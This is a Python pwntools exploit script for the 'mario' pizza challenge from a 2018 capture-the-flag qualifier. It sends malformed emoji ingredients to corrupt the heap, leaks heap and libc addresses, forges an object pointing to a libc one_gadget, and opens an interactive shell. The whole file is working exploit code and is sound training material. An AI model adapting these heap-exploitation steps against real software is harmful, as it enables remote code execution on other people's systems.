#!/usr/bin/env python
from pwn import *
from pow import solve_pow

def create(name):
    s.sendlineafter('Choice: ','N')
    if len(name) < 0x12c:
        name += '\n'
    s.sendafter('name? ',name)

def login(name):
    s.sendlineafter('Choice: ','L')
    if len(name) < 0x12c:
        name += '\n'
    s.sendafter('name? ',name)

def order(pizza):
    s.sendlineafter('Choice: ','O')
    s.sendlineafter('pizzas? ',str(len(pizza)))
    for ings in pizza:
        s.sendlineafter('ingredients? ',str(len(ings)))
        for ing in ings:
            if len(ing) < 0x14:
                ing += '\n'
            s.sendafter(': ',ing)

def cook(data):
    s.sendlineafter('Choice: ','C')
    if len(data) < 0x12c:
        data += '\n'
    s.sendafter('explain: ',data)

def admire():
    s.sendlineafter('Choice: ','A')

def leave():
    s.sendlineafter('Choice: ','L')

def please(data):
    s.sendlineafter('Choice: ','P')
    if len(data) < 0x12c:
        data += '\n'
    s.sendafter('yourself: ',data)

def why():
    s.sendlineafter('Choice: ','W')
    s.recvuntil('say: ')
    return s.recvline(False)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./mario', env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('83b1db91.quals2018.oooverflow.io',31337)
        s.recvuntil('Challenge: ')
        challenge = s.recvline(False)
        s.recvuntil('n: ')
        n = int(s.recvline(False))
        s.sendline(str(solve_pow(challenge,n)))

    pineapple = u'\U0001f34d'.encode('utf8')
    tomato = u'\U0001f345'.encode('utf8')
    chicken = u'\U0001f414'.encode('utf8')
    banana = u'\U0001f34c'.encode('utf8')
    poo = u'\U0001f4a9'.encode('utf8')

    create('A')
    order([['\xf0' * 3 + '\x9f','\x8d' * 2] for i in range(0x10)] + [[tomato]])
    cook('A' * 0x78)
    leave()
    heap_addr = u64(why().ljust(8,'\0')) - 0x1120
    log.info('heap address: %#x' % heap_addr)

    create('B')
    leave()
    libc_base = u64(why().ljust(8,'\0')) - 0x3c4bf8
    log.info('libc base: %#x' % libc_base)

    login('B')
    order([['\xf0' * 3 + '\x9f','\x8d' * 2] for i in range(0x10)] + [[tomato]])
    cook('A' * 0x38)
    leave()

    create('C')
    leave()

    one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    login('B')
    payload = ''
    payload += p64(heap_addr + 0x8)
    payload += 'C'.ljust(8,'\0')
    payload += p64(heap_addr) * 3
    payload += p64(heap_addr + 0x48)
    payload += p64(heap_addr + 0x50) * 2
    payload += p64(0)
    payload += p64(heap_addr + 0x58)
    payload += p64(0)
    payload += p64(heap_addr + 0x60)
    payload += p64(libc_base + one_gadget[1])
    please(payload)

    login('C')
    admire()

    s.interactive()
